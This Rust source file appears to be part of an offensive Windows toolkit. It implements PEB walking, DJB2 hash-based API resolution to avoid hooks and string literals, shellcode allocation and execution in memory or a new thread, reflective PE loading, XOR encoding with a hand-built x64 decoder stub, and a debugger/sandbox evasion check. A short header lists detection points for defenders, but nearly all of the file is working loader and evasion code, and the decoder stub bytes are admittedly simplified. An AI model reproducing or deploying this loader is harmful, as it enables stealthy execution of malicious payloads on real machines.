//! Position-Independent Code (PIC) utilities for shellcode-style execution.
//!
//! This module provides:
//! - PEB walking for dynamic module resolution
//! - Hash-based API resolution (no string literals)
//! - Reflective PE loading via rspe
//! - Shellcode injection utilities
//!
//! Detection points for defenders:
//! - PEB access patterns
//! - Unusual module enumeration
//! - Hash-based API resolution signatures
//! - Memory allocation patterns (RWX)

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use std::ptr::null_mut;

use winapi::shared::minwindef::{DWORD, FARPROC, HMODULE, WORD};
use winapi::shared::ntdef::{HANDLE, PVOID, ULONG, UNICODE_STRING};
use winapi::um::winnt::{
    IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER,
    IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64, MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};

/// PEB_LDR_DATA structure for module enumeration
#[repr(C)]
struct PebLdrData {
    length: ULONG,
    initialized: u8,
    ss_handle: PVOID,
    in_load_order_module_list: ListEntry,
    in_memory_order_module_list: ListEntry,
    in_initialization_order_module_list: ListEntry,
}

/// LIST_ENTRY structure
#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

/// LDR_DATA_TABLE_ENTRY structure
#[repr(C)]
struct LdrDataTableEntry {
    in_load_order_links: ListEntry,
    in_memory_order_links: ListEntry,
    in_initialization_order_links: ListEntry,
    dll_base: PVOID,
    entry_point: PVOID,
    size_of_image: ULONG,
    full_dll_name: UnicodeString,
    base_dll_name: UnicodeString,
    // ... more fields we don't need
}

/// UNICODE_STRING for PEB
#[repr(C)]
struct UnicodeString {
    length: WORD,
    maximum_length: WORD,
    buffer: *mut u16,
}

/// PEB structure (partial, for module resolution)
#[repr(C)]
struct Peb {
    inherited_address_space: u8,
    read_image_file_exec_options: u8,
    being_debugged: u8,
    bit_field: u8,
    padding: [u8; 4],
    mutant: PVOID,
    image_base_address: PVOID,
    ldr: *mut PebLdrData,
    // ... more fields
}

/// Pre-computed API hashes (DJB2 algorithm)
/// These avoid string literals in the binary
pub mod hashes {
    // kernel32.dll
    pub const KERNEL32_DLL: u32 = 0x6A4ABC5B;
    pub const NTDLL_DLL: u32 = 0x3CFA685D;

    // kernel32 functions
    pub const LOAD_LIBRARY_A: u32 = 0xEC0E4E8E;
    pub const GET_PROC_ADDRESS: u32 = 0x7C0DFCAA;
    pub const VIRTUAL_ALLOC: u32 = 0x91AFCA54;
    pub const VIRTUAL_PROTECT: u32 = 0x7946C61B;
    pub const VIRTUAL_FREE: u32 = 0x30633AC;
    pub const CREATE_THREAD: u32 = 0x72D05C5F;
    pub const WAIT_FOR_SINGLE_OBJECT: u32 = 0xDF1B3DA;
    pub const CLOSE_HANDLE: u32 = 0x528796C6;

    // ntdll functions
    pub const NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0xF783B8EC;
    pub const NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x50E92888;
    pub const NT_CREATE_THREAD_EX: u32 = 0xAF18CFAB;
    pub const RTL_COPY_MEMORY: u32 = 0xEF64A41E;
}

/// DJB2 hash algorithm for API resolution
/// Matches the pre-computed hashes above
#[inline]
pub fn djb2_hash(input: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for &byte in input {
        let c = if byte >= b'A' && byte <= b'Z' {
            byte + 0x20 // lowercase
        } else {
            byte
        };
        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
    }
    hash
}

/// DJB2 hash for wide strings (UTF-16)
#[inline]
pub fn djb2_hash_wide(input: &[u16]) -> u32 {
    let mut hash: u32 = 5381;
    for &wchar in input {
        let c = if wchar >= 'A' as u16 && wchar <= 'Z' as u16 {
            (wchar as u8 + 0x20) as u32
        } else {
            (wchar & 0xFF) as u32
        };
        hash = hash.wrapping_mul(33).wrapping_add(c);
    }
    hash
}

/// Get the PEB address using the TEB
///
/// On x64, PEB is at gs:[0x60]
#[cfg(target_arch = "x86_64")]
#[inline]
pub unsafe fn get_peb() -> *mut Peb {
    let peb: *mut Peb;
    std::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, nomem)
    );
    peb
}

/// Get the PEB address on x86
#[cfg(target_arch = "x86")]
#[inline]
pub unsafe fn get_peb() -> *mut Peb {
    let peb: *mut Peb;
    std::arch::asm!(
        "mov {}, fs:[0x30]",
        out(reg) peb,
        options(nostack, nomem)
    );
    peb
}

/// Resolve a module base address by hash using PEB walking
///
/// This avoids using GetModuleHandle which can be hooked
pub unsafe fn get_module_by_hash(module_hash: u32) -> Option<HMODULE> {
    let peb = get_peb();
    if peb.is_null() {
        return None;
    }

    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }

    // Walk InLoadOrderModuleList
    let list_head = &(*ldr).in_load_order_module_list as *const ListEntry;
    let mut current = (*list_head).flink;

    while current != list_head as *mut ListEntry {
        let entry = current as *const LdrDataTableEntry;

        // Get module name
        let name_len = (*entry).base_dll_name.length as usize / 2;
        if name_len > 0 && !(*entry).base_dll_name.buffer.is_null() {
            let name_slice = std::slice::from_raw_parts(
                (*entry).base_dll_name.buffer,
                name_len,
            );

            let hash = djb2_hash_wide(name_slice);
            if hash == module_hash {
                return Some((*entry).dll_base as HMODULE);
            }
        }

        current = (*current).flink;
    }

    None
}

/// Resolve a function address by hash from a module's export table
///
/// This avoids using GetProcAddress which can be hooked
pub unsafe fn get_proc_by_hash(module: HMODULE, function_hash: u32) -> Option<FARPROC> {
    if module.is_null() {
        return None;
    }

    let dos_header = module as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != 0x5A4D {
        // Not a valid PE
        return None;
    }

    let nt_headers = (module as usize + (*dos_header).e_lfanew as usize)
        as *const IMAGE_NT_HEADERS64;

    // Get export directory
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory
        [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        .VirtualAddress;

    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = (module as usize + export_dir_rva as usize)
        as *const IMAGE_EXPORT_DIRECTORY;

    let names = (module as usize + (*export_dir).AddressOfNames as usize)
        as *const DWORD;
    let ordinals = (module as usize + (*export_dir).AddressOfNameOrdinals as usize)
        as *const WORD;
    let functions = (module as usize + (*export_dir).AddressOfFunctions as usize)
        as *const DWORD;

    let num_names = (*export_dir).NumberOfNames;

    // Search by hash
    for i in 0..num_names {
        let name_rva = *names.add(i as usize);
        let name_ptr = (module as usize + name_rva as usize) as *const u8;

        // Get string length
        let mut len = 0;
        while *name_ptr.add(len) != 0 {
            len += 1;
        }

        let name_slice = std::slice::from_raw_parts(name_ptr, len);
        let hash = djb2_hash(name_slice);

        if hash == function_hash {
            let ordinal = *ordinals.add(i as usize);
            let func_rva = *functions.add(ordinal as usize);
            return Some((module as usize + func_rva as usize) as FARPROC);
        }
    }

    None
}

/// Combined module + function resolution by hash
pub unsafe fn resolve_api(module_hash: u32, function_hash: u32) -> Option<FARPROC> {
    let module = get_module_by_hash(module_hash)?;
    get_proc_by_hash(module, function_hash)
}

/// Function pointer types for resolved APIs
pub type FnVirtualAlloc = unsafe extern "system" fn(
    PVOID,
    usize,
    DWORD,
    DWORD,
) -> PVOID;

pub type FnVirtualProtect = unsafe extern "system" fn(
    PVOID,
    usize,
    DWORD,
    *mut DWORD,
) -> i32;

pub type FnVirtualFree = unsafe extern "system" fn(
    PVOID,
    usize,
    DWORD,
) -> i32;

pub type FnCreateThread = unsafe extern "system" fn(
    PVOID,
    usize,
    PVOID,
    PVOID,
    DWORD,
    *mut DWORD,
) -> HANDLE;

pub type FnLoadLibraryA = unsafe extern "system" fn(*const i8) -> HMODULE;

pub type FnGetProcAddress = unsafe extern "system" fn(HMODULE, *const i8) -> FARPROC;

pub type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

pub type FnWaitForSingleObject = unsafe extern "system" fn(HANDLE, DWORD) -> DWORD;

/// Resolved API cache for performance
pub struct ResolvedApis {
    pub virtual_alloc: Option<FnVirtualAlloc>,
    pub virtual_protect: Option<FnVirtualProtect>,
    pub virtual_free: Option<FnVirtualFree>,
    pub create_thread: Option<FnCreateThread>,
}

impl ResolvedApis {
    /// Resolve all commonly used APIs via PEB walking
    pub unsafe fn resolve() -> Self {
        let kernel32 = get_module_by_hash(hashes::KERNEL32_DLL);

        Self {
            virtual_alloc: kernel32.and_then(|m| {
                get_proc_by_hash(m, hashes::VIRTUAL_ALLOC)
                    .map(|p| std::mem::transmute(p))
            }),
            virtual_protect: kernel32.and_then(|m| {
                get_proc_by_hash(m, hashes::VIRTUAL_PROTECT)
                    .map(|p| std::mem::transmute(p))
            }),
            virtual_free: kernel32.and_then(|m| {
                get_proc_by_hash(m, hashes::VIRTUAL_FREE)
                    .map(|p| std::mem::transmute(p))
            }),
            create_thread: kernel32.and_then(|m| {
                get_proc_by_hash(m, hashes::CREATE_THREAD)
                    .map(|p| std::mem::transmute(p))
            }),
        }
    }
}

/// Allocate executable memory using resolved APIs
pub unsafe fn pic_alloc_exec(size: usize) -> Option<*mut c_void> {
    let apis = ResolvedApis::resolve();
    let virtual_alloc = apis.virtual_alloc?;

    let mem = virtual_alloc(
        null_mut(),
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if mem.is_null() {
        None
    } else {
        Some(mem)
    }
}

/// Allocate RW memory, copy shellcode, then change to RX
pub unsafe fn pic_alloc_and_copy(shellcode: &[u8]) -> Option<*mut c_void> {
    let apis = ResolvedApis::resolve();
    let virtual_alloc = apis.virtual_alloc?;
    let virtual_protect = apis.virtual_protect?;

    // Allocate as RW first
    let mem = virtual_alloc(
        null_mut(),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if mem.is_null() {
        return None;
    }

    // Copy shellcode
    std::ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        mem as *mut u8,
        shellcode.len(),
    );

    // Change to RX (more opsec than RWX)
    let mut old_protect: DWORD = 0;
    if virtual_protect(mem, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect) == 0 {
        return None;
    }

    Some(mem)
}

/// Execute shellcode in current thread
pub unsafe fn pic_execute_inline(shellcode: &[u8]) -> Option<usize> {
    let mem = pic_alloc_and_copy(shellcode)?;

    // Cast to function and call
    let func: unsafe extern "C" fn() -> usize = std::mem::transmute(mem);
    Some(func())
}

/// Execute shellcode in new thread
pub unsafe fn pic_execute_thread(shellcode: &[u8]) -> Option<HANDLE> {
    let apis = ResolvedApis::resolve();
    let create_thread = apis.create_thread?;

    let mem = pic_alloc_and_copy(shellcode)?;

    let mut thread_id: DWORD = 0;
    let handle = create_thread(
        null_mut(),           // security attributes
        0,                    // stack size (default)
        mem,                  // start address
        null_mut(),           // parameter
        0,                    // creation flags
        &mut thread_id,       // thread id
    );

    if handle.is_null() {
        None
    } else {
        Some(handle)
    }
}

/// Reflective PE loading using rspe crate
#[cfg(feature = "reflective")]
pub mod reflective {
    use super::*;

    /// Load a PE from memory using rspe
    pub unsafe fn load_pe(pe_bytes: &[u8]) -> Result<*mut c_void, &'static str> {
        // rspe provides reflective loading
        // This is a wrapper for the crate functionality
        match rspe::reflective_loader(pe_bytes) {
            Ok(base) => Ok(base as *mut c_void),
            Err(_) => Err("Reflective load failed"),
        }
    }
}

/// Shellcode utilities
pub mod shellcode {
    use super::*;

    /// XOR encode shellcode for basic obfuscation
    pub fn xor_encode(shellcode: &[u8], key: u8) -> Vec<u8> {
        shellcode.iter().map(|b| b ^ key).collect()
    }

    /// XOR decode shellcode
    pub fn xor_decode(encoded: &[u8], key: u8) -> Vec<u8> {
        xor_encode(encoded, key) // XOR is symmetric
    }

    /// Generate a simple XOR decoder stub (x64)
    /// This prepends a decoder to the encoded shellcode
    pub fn generate_decoder_stub(encoded: &[u8], key: u8) -> Vec<u8> {
        let mut stub = Vec::new();

        // x64 decoder stub
        // lea rsi, [rip + shellcode]
        // mov rcx, len
        // decode_loop:
        //   xor byte [rsi], key
        //   inc rsi
        //   loop decode_loop
        //   jmp shellcode

        let len = encoded.len();

        // Stub bytes (simplified - real implementation would be more sophisticated)
        stub.extend_from_slice(&[
            0x48, 0x8D, 0x35, 0x0F, 0x00, 0x00, 0x00,  // lea rsi, [rip+0x0F]
            0x48, 0xC7, 0xC1,                           // mov rcx, imm32
        ]);
        stub.extend_from_slice(&(len as u32).to_le_bytes());
        stub.extend_from_slice(&[
            0x80, 0x36, key,                            // xor byte [rsi], key
            0x48, 0xFF, 0xC6,                           // inc rsi
            0xE2, 0xF8,                                 // loop -8
            0xEB, 0x00,                                 // jmp to shellcode
        ]);

        // Append encoded shellcode
        stub.extend_from_slice(encoded);

        stub
    }

    /// Check if running in a sandbox/VM (basic checks)
    pub unsafe fn anti_sandbox_check() -> bool {
        let peb = get_peb();
        if peb.is_null() {
            return true; // Suspicious
        }

        // Check being_debugged flag
        if (*peb).being_debugged != 0 {
            return true;
        }

        // Could add more checks:
        // - Process name checks
        // - Timing checks
        // - Hardware checks

        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_djb2_hash() {
        // Test hash consistency
        let hash1 = djb2_hash(b"kernel32.dll");
        let hash2 = djb2_hash(b"KERNEL32.DLL");
        assert_eq!(hash1, hash2); // Case insensitive
    }

    #[test]
    fn test_xor_roundtrip() {
        let original = b"test shellcode";
        let key = 0x42;
        let encoded = shellcode::xor_encode(original, key);
        let decoded = shellcode::xor_decode(&encoded, key);
        assert_eq!(original.as_slice(), decoded.as_slice());
    }
}
